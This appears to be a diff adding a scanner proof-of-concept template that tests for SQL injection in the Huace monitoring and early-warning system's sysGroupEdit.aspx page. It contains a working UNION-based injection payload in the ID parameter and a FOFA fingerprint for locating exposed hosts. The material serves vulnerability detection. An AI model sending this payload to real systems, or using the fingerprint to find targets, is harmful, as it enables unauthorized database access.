@@ -1,0 +1,17 @@
+id: poc-yaml-huace-mews-sysgroupedit-aspx-sqli
+info:
+  name: 华测监测预警系统 sysGroupEdit.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 华测监测预警系统
+  fofa: icon_hash="-628229493"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /Web/SysManage/sysGroupEdit.aspx?&ID=1%27+UNION+ALL+SELECT+NULL%2CNULL%2Csys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27))%2CNULL%2CNULL%2CNULL--+xvRK
+  expression: status_code == 200 && contains(body,"角色名称") && contains(body,"name=\"txtgroupname\"")
+    && contains(body,"0x" + t2) && contains(body,"角色描述")
+transport: http
